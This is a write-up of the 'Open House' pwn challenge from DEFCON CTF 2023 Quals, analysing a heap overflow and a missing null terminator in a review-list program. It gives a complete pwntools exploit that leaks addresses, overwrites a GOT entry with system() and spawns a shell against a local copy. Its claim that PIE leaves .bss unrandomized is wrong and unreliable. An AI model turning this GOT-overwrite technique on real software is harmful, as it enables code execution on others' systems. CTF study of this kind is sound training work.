# Open House (DEFCON CTF 2023 Qualifiers)

Description
```
You are cordially invited to an exclusive Open House event, where dreams meet reality and possibilities abound.
Join us for an unforgettable experience as we showcase a captivating array of properties, each waiting to become your dream home.

Host: open-house-6dvpeatmylgze.shellweplayaga.me
Port: 10001
```
Category - Quals  
Points - 64  

This is the easiest binary challenge in DEFCON CTF 2023 Quals. I worked hard on this one but didn't get it.
I found that there is heap overflow due to the modify function, and we can use it to overwrite the GOT table, but didn't know how.

## Warning

The solution here is not a complete solution since I'm running the program on my own machine, instead of attacking a remote host.

## Analysis

The program shows reviews and allows us to create (c), delete (d), modify (m), or view (v) the entries.
By default there are 10 reviews. We can type q to quit.

```
Welcome! Step right in and discover our hidden gem! You'll *love* the pool.
c|v|q> c
Absolutely, we'd love to have your review!
test
Thanks!
c|v|m|d|q> v
Check out these recent rave reviews from other prospective homebuyers:
**** - This charming and cozy house exudes a delightful charm that will make you feel right at home. Its warm and inviting ambiance creates a comforting haven to retreat to after a long day's hard work.
**** - Don't let its unassuming exterior fool you; this house is a hidden gem. With its affordable price tag, it presents an excellent opportunity for first-time homebuyers or those seeking a strong investment.
**** - Step into this well-maintained house, and you'll find a tranquil retreat awaiting you. From its tidy interior to the carefully tended garden, every corner of this home reflects the care and attention bestowed upon it.
**** - Situated in a prime location, this house offers unparalleled convenience. Enjoy easy access to schools, shops, and public transportation, making everyday tasks a breeze.
**** - Although not extravagant, this house offers a blank canvas for your creativity and personal touch. Imagine the endless possibilities of transforming this cozy abode into your dream home, perfectly tailored to your taste and style.
**** - Discover the subtle surprises that this house holds. From a charming reading nook tucked away by the window to a tranquil backyard oasis, this home is full of delightful features that will bring joy to your everyday life.
**** - Embrace a strong sense of community in this neighborhood, where friendly neighbors become extended family. Forge lasting friendships and create a sense of belonging in this warm and welcoming environment.
**** - With its well-kept condition, this house minimizes the hassle of maintenance, allowing you to spend more time doing the things you love. Move in with peace of mind, knowing that this home has been diligently cared for.
**** - Whether you're looking to expand your investment portfolio or start your real estate journey, this house presents a fantastic opportunity. Its affordability and potential for future value appreciation make it a smart choice for savvy buyers.
**** - Escape the hustle and bustle of everyday life and find solace in the tranquility of this home. Its peaceful ambiance and comfortable layout provide a sanctuary where you can relax, recharge, and create beautiful memories with loved ones.
**** - test

c|v|m|d|q> q
Thanks for stopping by!
```

The reviews are stored in the heap, as a doubly-linked list. Each review has a body with a length of 0x200, with two pointers following
(first one is forward pointer, pointing to the next entry, second one is the back pointer, pointing to the last), so the total length is 0x208.

I found two vulnerabilities. First, the strncpy function is used to create review entries.
But if the string to be loaded is too large, the string loaded into memory will not be null terminated.
Second, the modify function allows us to modify up to a length of 0x210, meaning that we can easily overwrite the pointers.

## Solution

I come up with the solution below only after reading the answers by the others, so I would like to give credit to them here:
https://robbert1978.github.io/posts/OpenHouse-DEFCON-Quals-2023/  
https://scavengersecurity.com/posts/defconquals-openhouse/

If we create an overflowed entry, the body of the review will not be null terminated, so when we view it, we can read beyond the body,
and see the pointers. This leaks the address in the heap.
However, the program enabled PIE, so address in the heap is randomized.
Nevertheless, there is a hidden 0th entry, which resides in the .bss segment instead of heap.
By deleting all entries and create an overflowed entry, we can read the bk pointer pointing to the 0th entry (in .bss).

The .bss segment is not randomized, like most of the memories space. (PIE only randomized certain segments, such as the heap)
Therefore, we can calculate the address of the GOT table.
The GOT table (Global Offset Table) contains pointers to libc functions.
We can read it by first modifying the 1st entry's forward pointer, then when the program tries to read the 2nd entry,
it will find the 2nd entry through the 1st entry's forward pointer, and land at wherever we want.
Similarly we can modify any memory, but modifying the 1st entry's forward pointer and then modifying the 2nd entry (which is any memory we like).

Therefore, we can read the address of an libc function in the GOT table, calculate the address of system() in libc,
then find a suitable libc function to be replaced by system().
The address of system() can always be calculated if you know the libc version and the address of any libc function.
The libc version can also be deduced by the address of one, or some, libc functions, using libc databases like https://libc.blukat.me/ .
To replace the function with system(), we modify the GOT entry of that function with the address of system().

Here is the python script I used to get a shell

```
from pwn import *

def create(data):
    p.sendlineafter(b"c|v",b"c",timeout=10)
    p.sendline(data)

def modify(idx,data):
    p.sendlineafter(b"c|v",b"m",timeout=10)
    p.sendline(idx)
    p.sendline(data)

def view():
    p.sendlineafter(b"c|v",b"v",timeout=10)

def delete(idx):
    p.sendlineafter(b"c|v",b"d",timeout=10)
    p.sendline(idx)

# Initialize
libc = ELF("/lib32/libc.so.6")
e = ELF("./open-house")
p = e.process()

# We have to create an entry in order to unlock all functionalities
create(b"test")

# Delete all entries
for i in range(11):
    delete(b"1")

# Create an entry with overflowing "A"s.
# Due to the behaviour of strncpy, a string without null termination is loaded into the heap.
# Then we create one more entry so that the fwd pointer of the 1st entry is not null.
# This will leak the pointers of the 1st entry when we view it.
create(b"A"*520)
create(b"something")

# We view it and read the pointers.
# The first pointer is the fwd pointer, pointing to the next entry.
# The second pointer is the bk pointer, pointing to the last entry.
# In this case, bk points to the 0th entry, which is at .bss segment.
view()
test = p.recvuntil(b"A"*512,timeout=10)
fwd = p.recv(4,timeout=10)
bk = p.recv(4,timeout=10)
print("The pointer to the 0th entry at .bss:")
print(bk)

# .bss is outside the heap, so its address is not randomized.
# We can use this address as an anchor to find the addresses of the other stuff.
# In particular, we are interested in the GOT table, where pointers to libc functions are stored.
#
# Below is some references:
# fputs@got.plt is at bk-0x10, it contains the address of fputs@libc
# strlen@got.plt is at bk-0x24, it contains the address of strlen@libc
got_fputs_addr = p32(u32(bk) - u8(b"\x10"))
got_strlen_addr = p32(u32(bk) - u8(b"\x24"))
print("The calculated address of fputs@got.plt:")
print(got_fputs_addr)
print("The calculated address of strlen@got.plt:")
print(got_strlen_addr)

# Modify the fwd pointer of the 1st entry, and point it to fputs@got.plt, so that we can read its content
modify(b"1",b"B"*512+got_fputs_addr+b"\x00"*4)

# View the entries and read the pointer (address) to fputs@libc
view()
p.recvuntil(b"B"*512,timeout=10)
p.recvline(timeout=10)  #leakage of the address you put in
p.recvuntil(b"**** - ",timeout=10)
libc_leak = p.recv(4,timeout=10) #the address of fputs@libc
print("The leaked address of fputs@libc:")
print(libc_leak)

# Calculate the address of system@libc, which will allow us to spawn a terminal.
# Here we know the version of libc so we don't need to search for the libc version.
system_addr = p32(u32(libc_leak) - libc.sym.fputs + libc.sym.system)
print("The calculated address of system@libc:")
print(system_addr)

# Modify the fwd pointer of the 1st entry to strlen@got.plt,
# and then modify the 2nd entry (now it's strlen@got.plt) to system@libc, so that strlen@got.plt points to system@libc.
# Lastly, create a new entry with "/bin/sh" as the content, to trigger strlen("/bin/sh"), which now becomes system("/bin/sh")
modify(b"1",b"B"*512+got_strlen_addr+b"\x00"*4)
modify(b"2",system_addr)
create(b"/bin/sh")

# Enjoy!
p.interactive()
```

Note that the code only works locally, because I'm working on it after the end of the competition.
According to the references, however, the libc version of the remote host is probably not found in many libc databases.
So the solution here is considerably easier than what is needed actually if you are unable to figure out the libc version.

Final notes:  
I didn't make it clear how to find the address of the GOT or of system().
To put it simple, you can get the memory map by debugging the program with gdb.
The offsets works even in a remote host, because they're fixed (but not for the heap becuz of randomization).
To find system() address, we need to know the libc version first.
The offsets to a particular function is fixed for a given libc version.
So if you know the libc version and address to any one function, you know the address of system() relative to the function.
